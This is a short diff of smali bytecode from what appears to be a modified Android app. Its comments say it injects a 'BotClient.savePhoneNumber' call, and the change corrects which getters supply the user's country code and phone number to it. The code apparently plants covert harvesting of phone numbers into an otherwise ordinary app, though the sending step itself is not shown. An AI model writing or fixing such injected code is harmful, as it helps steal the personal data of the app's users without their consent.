@@ -3589,15 +3589,15 @@
     .line 80
     invoke-virtual {v1, v2}, La03/f;->s(Ljava/lang/String;)V
 
-    # Injecting BotClient.savePhoneNumber with correct concatenated fields
+    # Injecting BotClient.savePhoneNumber with correct getters
     invoke-direct {v0}, Ld13/k;->P1()Li13/a;
     move-result-object v3
     
-    # Get Country Code (d())
-    invoke-virtual {v3}, Li13/a;->d()Ljava/lang/String;
+    # Get Country Code (d() was WRONG, field 'e' maps to 'i()')
+    invoke-virtual {v3}, Li13/a;->i()Ljava/lang/String;
     move-result-object v4
     
-    # Get Phone Body (q())
+    # Get Phone Body (q() is correct for field 'd' phoneWithoutCode)
     invoke-virtual {v3}, Li13/a;->q()Ljava/lang/String;
     move-result-object v3
     
